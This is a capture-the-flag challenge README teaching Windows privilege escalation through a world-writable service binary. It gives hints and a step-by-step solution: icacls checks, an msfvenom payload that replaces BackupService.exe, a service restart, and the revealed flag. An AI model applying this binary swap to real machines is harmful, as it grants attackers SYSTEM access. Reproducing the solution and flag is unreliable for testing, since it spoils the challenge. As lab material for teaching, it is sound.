# Challenge 3  Weak Service Binary Permissions

**Difficulty:** Easy  
**Category:** Windows Privilege Escalation  
**Flag:** hidden at `C:\CTF\challenge3\flag.txt`

---

## Story

You're `ctfplayer` on a Windows machine.
A developer installed a "BackupService" but made a critical mistake with file permissions.
The service runs as SYSTEM. The binary it runs is... writable by everyone.

---

## Setup

1. Start a **Windows VM**
2. Open PowerShell **as Administrator**
3. Run:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

4. Log in as `ctfplayer` / `Player123!`

---

## Hints

<details>
<summary>Hint 1</summary>
Find services running as SYSTEM and check their binary paths:

```powershell
Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select Name, PathName
```

Then check the permissions on the binary itself:

```powershell
icacls "C:\Services\BackupService\BackupService.exe"
```
</details>

<details>
<summary>Hint 2</summary>
If you can write to the service binary, you can replace it entirely with your own executable.
When the service restarts, it runs YOUR code as SYSTEM.
</details>

<details>
<summary>Hint 3</summary>
Generate a replacement binary with msfvenom, or for the CTF just drop a script that copies the flag.
After replacing the binary, restart the service:

```powershell
Restart-Service BackupService
```
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Find the vulnerable service and check permissions

```powershell
icacls "C:\Services\BackupService\BackupService.exe"
```

Output includes:
```
Everyone:(F)
```

Full control for everyone  we can overwrite the binary.

### Step 2  Replace the binary with a payload

On your attack machine (Kali/Mac), generate a malicious exe:

```bash
msfvenom -p windows/x64/exec \
  CMD='cmd /c copy C:\CTF\challenge3\flag.txt C:\Users\Public\flag.txt && icacls C:\Users\Public\flag.txt /grant Everyone:F' \
  -f exe -o BackupService.exe
```

Copy it to the Windows VM and overwrite the original:

```powershell
Copy-Item C:\Users\ctfplayer\Desktop\BackupService.exe `
  -Destination "C:\Services\BackupService\BackupService.exe" -Force
```

### Step 3  Restart the service

```powershell
Restart-Service BackupService
```

Windows stops the old binary and starts your replacement as SYSTEM.

### Step 4  Read the flag

```powershell
type C:\Users\Public\flag.txt
```

```
CTF{w34k_s3rv1c3_b1n_r3pl4c3d}
```

### Why this works

Service binaries run under the account configured for that service  often SYSTEM or a high-privileged account. If the binary itself is writable by low-privileged users, an attacker can silently swap it for a malicious one. Service binary files should be owned by SYSTEM or Administrators with no write permissions for regular users.

</details>
